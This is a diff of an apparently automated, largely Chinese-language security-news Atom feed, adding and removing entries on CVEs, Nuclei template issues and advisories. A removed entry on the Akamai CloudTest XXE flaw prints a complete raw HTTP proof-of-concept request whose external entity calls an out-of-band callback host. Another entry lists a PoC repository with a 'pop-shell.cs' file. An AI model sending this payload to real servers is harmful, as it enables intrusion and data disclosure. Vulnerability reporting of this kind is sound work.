@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-02T04:00:47.189Z</updated>
+  <updated>2025-07-02T04:45:37.127Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,85 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Nuclei CVE-2023-5561 Vulnerability</title>
+    <link href="http://example.com/2025/07/02/github_1115355293/"/>
+    <id>http://example.com/2025/07/02/github_1115355293/</id>
+    <published>2025-07-02T04:45:37.129Z</published>
+    <updated>2025-07-02T04:45:37.127Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Nuclei CVE-2023-5561 Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-5561</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> 该漏洞与Nuclei模板中的CVE-2023-5561相关，具体细节未公开。</p><p><strong>产品厂商：</strong> projectdiscovery</p><p><strong>产品名称：</strong> nuclei-templates</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12187">https://github.com/projectdiscovery/nuclei-templates/issues/12187</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Template-IDs-or-paths"><a href="#Template-IDs-or-paths" class="headerlink" title="Template IDs or paths"></a>Template IDs or paths</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> CVE-2023-5561<br></code></pre></td></tr></table></figure><h4 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> OS: Ubuntu 20.04<br><span class="hljs-bullet">-</span> Nuclei: 3.4.4<br><span class="hljs-bullet">-</span> Go: 1.22.4<br></code></pre></td></tr></table></figure><h4 id="Steps-To-Reproduce"><a href="#Steps-To-Reproduce" class="headerlink" title="Steps To Reproduce"></a>Steps To Reproduce</h4><p>nuclei -u <a href="https://site.com/">https://site.com</a> -id CVE-2023-5561</p><h4 id="Relevant-dumped-responses"><a href="#Relevant-dumped-responses" class="headerlink" title="Relevant dumped responses"></a>Relevant dumped responses</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br></code></pre></td></tr></table></figure><h4 id="Anything-else"><a href="#Anything-else" class="headerlink" title="Anything else?"></a>Anything else?</h4><p>Will send site in Discord</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Nuclei CVE-2023-5561 Vulnerability&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Github Poc</title>
+    <link href="http://example.com/2025/07/02/github_1475746638/"/>
+    <id>http://example.com/2025/07/02/github_1475746638/</id>
+    <published>2025-07-02T04:45:27.867Z</published>
+    <updated>2025-07-02T04:45:27.867Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> </p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49144</li></ul><p><strong>来源：</strong> <a href="https://github.com/timsonner/CVE-2025-49144-Research">https://github.com/timsonner/CVE-2025-49144-Research</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>archive-org.txt</li><li>call-agent-no-prompt.cs</li><li>call-agent.cs</li><li>npp.8.8.1.Installer.exe</li><li>npp.8.8.1.checksums.sha256</li><li>pop-shell.cs</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; &lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Cisco IOS Smart Install Buffer Overflow Vulnerability</title>
+    <link href="http://example.com/2025/07/02/github_1567481502/"/>
+    <id>http://example.com/2025/07/02/github_1567481502/</id>
+    <published>2025-07-02T04:45:18.388Z</published>
+    <updated>2025-07-02T04:45:18.387Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Cisco IOS Smart Install Buffer Overflow Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-0171</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Cisco IOS和IOS XE软件中的Smart Install功能存在缓冲区溢出漏洞，由于对Smart Install数据包的不当验证，未经认证的远程攻击者可通过向TCP端口4786发送特制的Smart Install消息，触发设备重启、执行任意代码或导致无限循环。</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> Cisco IOS and IOS XE Software</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:cisco:ios”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12325">https://github.com/projectdiscovery/nuclei-templates/issues/12325</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Cisco IOS and IOS XE Software contain a buffer overflow caused by improper validation of Smart Install packet data, letting unauthenticated remote attackers trigger device reload, execute arbitrary code, or cause indefinite loops, exploit requires sending crafted Smart Install message on TCP port 4786.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://vulncheck.com/xdb/6d4b443f23fc">https://vulncheck.com/xdb/6d4b443f23fc</a></li><li><a href="https://github.com/AlrikRr/Cisco-Smart-Exploit">https://github.com/AlrikRr/Cisco-Smart-Exploit</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:AlrikRr&#x2F;Cisco-Smart-Exploit.git</li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-cpe-cpe-2-3-o-cisco-ios"><a href="#Shodan-Query-cpe-cpe-2-3-o-cisco-ios" class="headerlink" title="Shodan Query: cpe:&quot;cpe:2.3:o:cisco:ios&quot;"></a>Shodan Query: <code>cpe:&quot;cpe:2.3:o:cisco:ios&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Cisco IOS Smart Install Buffer Overflow</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
+    
+  </entry>
   
   <entry>
     <title>zoomeye_team twitter update</title>
@@ -452,82 +531,6 @@
     <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
     <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Akamai CloudTest XXE注入漏洞</title>
-    <link href="http://example.com/2025/07/01/github_4180806610/"/>
-    <id>http://example.com/2025/07/01/github_4180806610/</id>
-    <published>2025-07-01T21:15:14.200Z</published>
-    <updated>2025-07-01T21:15:14.197Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Akamai CloudTest XXE注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49493</li></ul><p><strong>漏洞类型：</strong> XML实体注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Akamai CloudTest在版本60 2025.06.02 (12988)之前，通过<code>/concerto/services/RepositoryService</code> SOAP端点存在XML外部实体(XXE)注入漏洞，允许文件包含。</p><p><strong>产品厂商：</strong> Akamai</p><p><strong>产品名称：</strong> Akamai CloudTest</p><p><strong>影响版本：</strong> version &lt; 60 2025.06.02 (12988)</p><p><strong>来源：</strong> <a href="https://github.com/MuhammadWaseem29/CVE-2025-49493-Poc">https://github.com/MuhammadWaseem29/CVE-2025-49493-Poc</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Akamai-CloudTest-XXE-Injection"><a href="#Akamai-CloudTest-XXE-Injection" class="headerlink" title="Akamai CloudTest - XXE Injection"></a>Akamai CloudTest - XXE Injection</h2><p>Akamai CloudTest before <code>60 2025.06.02 (12988)</code> allows file inclusion via XML External Entity (XXE) injection through the <code>/concerto/services/RepositoryService</code> SOAP endpoint.</p><hr><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://xbow.com/blog/xbow-akamai-cloudtest-xxe/">https://xbow.com/blog/xbow-akamai-cloudtest-xxe/</a></li><li><a href="https://techdocs.akamai.com/cloudtest/changelog/june-2-2025-enhancements-and-bug-fixes">https://techdocs.akamai.com/cloudtest/changelog/june-2-2025-enhancements-and-bug-fixes</a></li></ul><hr><p><img src="https://github.com/user-attachments/assets/78ab085d-b700-4103-bf2e-d4719c000761" alt="image"></p><h3 id="Proof-of-Concept-Raw-HTTP-Request"><a href="#Proof-of-Concept-Raw-HTTP-Request" class="headerlink" title="Proof of Concept (Raw HTTP Request)"></a>Proof of Concept (Raw HTTP Request)</h3><pre><code class="language-http">POST //concerto/services/RepositoryService HTTP/1.1Host: readacted.comCache-Control: max-age=0Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Brave&quot;;v=&quot;138&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;macOS&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8Sec-Gpc: 1Accept-Language: en-US,en;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brPriority: u=0, iConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 610&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE soapenv:Envelope [  &lt;!ENTITY xxe SYSTEM &quot;http://b6it5hei11vmt9as2lbg98h4gvmrahy6.oastify.com&quot;&gt;]&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;                  xmlns:rep=&quot;http://example.com/services/repository&quot;&gt;   &lt;soapenv:Header/&gt;   &lt;soapenv:Body&gt;      &lt;rep:getUIBundleObjectXml&gt;         &lt;rep:uiBundleRequestXml&gt;&amp;xxe;&lt;/rep:uiBundleRequestXml&gt;      &lt;/rep:getUIBundleObjectXml&gt;   &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Akamai CloudTest XXE注入漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="XML实体注入" scheme="http://example.com/tags/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BlackHatEvents twitter update</title>
-    <link href="http://example.com/2025/07/01/twitter_327590077/"/>
-    <id>http://example.com/2025/07/01/twitter_327590077/</id>
-    <published>2025-07-01T21:00:26.254Z</published>
-    <updated>2025-07-01T21:00:26.251Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 想提升你的Kubernetes安全技能吗？📈 立即报名参加#BHUSA培训“无需0-Day：攻击与保护Kubernetes、Linux及容器”，向专家Jay Beale学习攻防实战技巧！这是一次动手实践、真实场景的培训。立即抢占席位 &gt;&gt; <a href="https://t.co/a8ZtQtSeMV">https://t.co/a8ZtQtSeMV</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940146644021883380">https://x.com/BlackHatEvents/status/1940146644021883380</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 想提升你的Kubernetes安全技能吗？📈 立即报名参加#BHUSA培训“无需0-Day：攻击与保护Kubernetes、Linux及容器”，</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>@modelcontextprotocol/server-filesystem allows for path validation bypass via prefix matching and symlink handling</title>
-    <link href="http://example.com/2025/07/01/github_3806837885/"/>
-    <id>http://example.com/2025/07/01/github_3806837885/</id>
-    <published>2025-07-01T20:30:08.500Z</published>
-    <updated>2025-07-01T20:30:08.498Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-q66q-fx2p-7w4m">https://github.com/advisories/GHSA-q66q-fx2p-7w4m</a></p><p><strong>仓库 Star：</strong> 57079</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/modelcontextprotocol/servers/security/advisories/GHSA-q66q-fx2p-7w4m">https://github.com/modelcontextprotocol/servers/security/advisories/GHSA-q66q-fx2p-7w4m</a></p></li><li><p><a href="https://github.com/modelcontextprotocol/servers/commit/d00c60df9d74dba8a3bb13113f8904407cda594f">https://github.com/modelcontextprotocol/servers/commit/d00c60df9d74dba8a3bb13113f8904407cda594f</a></p></li><li><p><a href="https://github.com/advisories/GHSA-q66q-fx2p-7w4m">https://github.com/advisories/GHSA-q66q-fx2p-7w4m</a></p></li></ul><p><strong>描述：</strong></p><p>Versions of Filesystem prior to 0.6.3 &amp; 2025.7.1 could allow access to unintended files via symlinks within allowed directories. Users are advised to upgrade to 2025.7.1 to resolve.</p><p>Thank you to Elad Beber (Cymulate) for reporting these issues.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-q66q-fx2p-7w4m&quot;&gt;https://github.com/advisories/GHSA-q66q-fx2p-7w4m&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
     
   </entry>
   
